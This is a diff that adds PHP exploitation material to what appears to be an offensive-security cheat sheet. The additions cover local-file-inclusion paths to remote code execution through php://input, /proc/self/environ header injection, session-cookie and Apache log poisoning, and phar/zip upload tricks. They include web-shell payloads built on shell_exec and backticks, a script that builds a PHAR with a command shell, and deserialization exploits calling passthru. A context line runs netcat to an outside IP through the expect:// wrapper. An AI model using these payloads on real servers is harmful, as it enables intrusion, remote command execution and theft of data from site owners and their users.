@@ -2264,7 +2264,7 @@
         // Use passthru with raw output
         // Use pipes with popen or proc_open
       #+end_src
-***** Protocol Wrappers
+***** Protocol Wrappers - LFI/RFE / RCE
       - [[https://www.php.net/manual/en/wrappers.php][Docs]] - RCE through HTTP parameters:
         #+begin_src sh
           # Plain text
@@ -2293,11 +2293,147 @@
 
           # or using ssh2, ftp, etc
         #+end_src
+      - LFI RCE through POST data:
+        #+begin_src sh
+          <url>?file=php://input
+
+          # POST body
+          <?= `<system-cmd>`; ?>
+        #+end_src
+      - LFI RCE through ~/proc/self/environ~:
+        #+begin_src sh
+          # First check that environ has content
+          <url>?file=/proc/self/environ
+
+          # If so, inject in the variables
+          <url>?file=/proc/self/environ&cmd=id
+          # Inject headers
+          User-Agent: <?= `$_GET['cmd']`; ?>
+        #+end_src
+      - LFI RCE through session cookies:
+        #+begin_src sh
+          # First check the session cookie file
+          <url>?file=/var/lib/php/sessions/sess_<PHPESSID-cookie>
+          # If not there, check <? phpinfo(); ?>
+          # for session.save_path
+          # Or, if possible, execute:
+          #   <?= ini_get('session.save_path');?>
+          # If empty, then try check for php.ini:
+          #   /etc/php<version>?/**/php.ini
+          #   Where ? mean no version: just php
+          #   and where ** could be:
+          #     A PHP version, such as 7.3
+          #     a server, such as apache2 or fpm
+          #     middle software, such as cgi, cli
+          #     a combination of both: modern OS
+          #   Also can be /usr/local/lib/php.ini
+          # Or, if possible, execute:
+          #   <?= php_ini_loaded_file(); ?>
+          # Or:
+          #   <?  print_r(php_ini_scanned_files());?>
+          # Else the sessions could be under:
+          #   /var/lib/php<version>?/sessions?/
+          #   /var/lib/php/mod_php/session/
+          #   /var/tmp/
+          #   /tmp/
+          # The tmp folders may have subfolders
+
+          # If accessible and one of the cookies
+          # appear in plaintext & can be modified
+          # (such as username), change it to:
+          <?= `$_GET['cmd']`; ?>
+        #+end_src
+      - LFI RCE through web logging:
+        #+begin_src sh
+          # First locate the Apache logs
+          <url>?file=/etc/apache2/apache2.conf
+          <url>?file=/etc/apache2/envvars
+
+          # Then check that the logs are readable
+          <url>?file=/var/log/apache2/access.log
+          <url>?file=/var/log/apache2/error.log
+
+          # Access a payloaded URL
+          <site>/<?php echo "<pre>" . shell_exec($_GET["cmd"] . " 2>&1") . "</pre>"; ?>
+
+          # And read the log back
+          <url>?file=/var/log/apache2/access.log&cmd=id
+        #+end_src
+      - Read local files + convert to base64:
+        #+begin_src sh
+          <url>?file=php://filter/read=convert.base64-encode/resource=./index.php
+        #+end_src
+      - Zip + Phar upload LFI RCE:
+        #+begin_src sh
+          # After uploading a Zip or Phar file
+          <url>?file=zip://file.zip#evil.php
+
+          <url>?file=phar://file.phar/evil.php
+          # See the section below for phar files
+        #+end_src
       - [[https://www.php.net/manual/en/wrappers.expect.php][Expect]] wrapper also allows cmd exec:
         #+begin_src sh
           # Test netcat, space is $IFS
           expect://nc$IFS10.0.0.1$IFS8080
         #+end_src
+***** PHAR files
+     - Command to create:
+       #+begin_src sh
+         # Bypass default PHAR files creation
+         php -c <(echo -e '[phar]\nphar.readonly = 0') create_phar.php
+       #+end_src
+     - Create for use in LFI ~phar://~ wrapper:
+       #+begin_src php
+         <?php
+             $filename = "test.phar";
+             $phar = new Phar($filename);
+             $phar->startBuffering();
+             $phar->setStub("<?php __HALT_COMPILER();");
+
+             $phar->addFromString("evil.php", '<?php echo `$_GET["cmd"] 2>&1`; ?>');
+
+             class MetadataStub {}
+             $object = new MetadataStub;
+             $phar->setMetadata($object);
+             $phar->stopBuffering();
+         ?>
+       #+end_src
+     - Exploit PHAR deserialization:
+       #+begin_src php
+         // After localizing the class to exploit
+         <?php
+             require("vuln_class.php");
+
+             $filename = "test.phar";
+             $phar = new Phar($filename);
+             $phar->startBuffering();
+             $phar->setStub("<?php __HALT_COMPILER();");
+             $phar->addFromString("test.txt", "test");
+
+             $object = new VulnClass();
+             $object->vuln_func = "passthru";
+             $object->vuln_arg = "id";
+
+             $phar->setMetadata($object);
+             $phar->stopBuffering();
+         ?>
+       #+end_src
+     - Embed a PHAR inside a JPG: [[https://github.com/kunte0/phar-jpg-polyglot/blob/master/phar_jpg_polyglot.php][see]]
+***** Object Deserialization
+     - Simple example:
+       #+begin_src php
+         <?php
+             require("vuln_class.php");
+
+             $object = new VulnClass();
+             $object->vuln_func = "passthru";
+             $object->vuln_arg = "id";
+
+             print_r(serialize($object).PHP_EOL);
+             // or save it to a file:
+             // file_put_contents("test", serialize($object));
+         ?>
+       #+end_src
 **** File Upload
 ***** Extensions
       - Try ~php3~, ~php4~, ~php5~, and ~phtml~
